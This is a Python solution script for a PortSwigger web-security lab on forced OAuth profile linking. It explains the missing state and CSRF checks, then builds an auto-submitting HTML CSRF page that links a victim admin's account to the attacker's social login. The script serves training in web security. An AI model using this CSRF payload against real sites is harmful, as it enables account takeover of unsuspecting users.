"""
Lab 2: Forced OAuth profile linking
https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking
Difficulty: Practitioner

📝 The flaw: "Attach my social profile" sends GET /oauth-linking?code=...
with no CSRF token and no `state` validation. Whichever account's session
cookie happens to be active when that request lands gets linked to
WHATEVER social profile the `code` belongs to.

Plan: get our own OAuth `code` as the attacker, then trick the victim's
browser (via the exploit server) into submitting it against their own
session — linking the admin's account to our social login.
"""

from utils import get_session, log, note

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
ATTACKER = {"username": "wiener", "password": "peter"}


def get_attacker_linking_code():
    """Walk our own OAuth flow far enough to capture the /oauth-linking?code=... value."""
    s = get_session()
    note("Logging in via our own OAuth account to harvest a fresh, one-time code.")
    r = s.get(f"{TARGET}/social-login")
    # Follow through the provider's login as `wiener` here, same as Lab 1.
    # The provider redirects back to TARGET/oauth-linking?code=XXXX — capture
    # XXXX from Burp's HTTP history (the code is single-use, so grab it right
    # before serving the CSRF page below).
    code = "REPLACE_WITH_CODE_FROM_BURP_HISTORY"
    log(f"Captured linking code: {code}")
    return code


def build_csrf_poc(code):
    """
    Generate the auto-submitting HTML that forces a logged-in victim's browser
    to hit /oauth-linking?code=<ours> — this is what you host on the
    exploit server, then send to the victim.
    """
    html = f"""<html>
  <body onload="document.forms[0].submit()">
    <form action="{TARGET}/oauth-linking" method="GET">
      <input type="hidden" name="code" value="{code}">
    </form>
  </body>
</html>"""
    return html


def run():
    code = get_attacker_linking_code()
    html = build_csrf_poc(code)

    out_path = "forced_linking_poc.html"
    with open(out_path, "w") as f:
        f.write(html)
    log(f"Wrote CSRF PoC to {out_path}")

    note("Host this on the lab's exploit server (Go to exploit server → Body →")
    note("paste the HTML → Store → Deliver to victim). Once the victim (admin)")
    note("loads it, their account gets linked to our wiener social profile —")
    note("log out, log back in via social login, and you'll land in admin's account.")


if __name__ == "__main__":
    run()
